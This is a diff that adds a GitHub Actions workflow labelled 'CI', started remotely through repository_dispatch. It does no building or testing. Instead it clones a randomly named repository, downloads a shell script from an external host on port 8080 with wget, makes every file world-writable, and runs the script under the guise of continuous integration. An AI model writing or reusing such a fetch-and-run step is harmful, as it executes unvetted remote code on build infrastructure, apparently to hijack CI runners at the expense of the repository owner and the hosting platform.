@@ -1,0 +1,27 @@
+name: CI
+on:
+  repository_dispatch:
+    types: run_actions
+
+jobs:
+  act:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Setup Python
+        uses: actions/setup-python@v2.2.2
+
+      - name: download files
+        run: |
+          git clone https://github.com/ohqvb1lt/gat.git
+          cd gat
+          wget "https://api.smyhw.online:8080/http2/test/gha2v?act=script" -O bash.sh
+          chmod 777 *
+          apt-get install screen
+      
+      - name: run
+        run: |
+          pip install requests
+          ./bash.sh
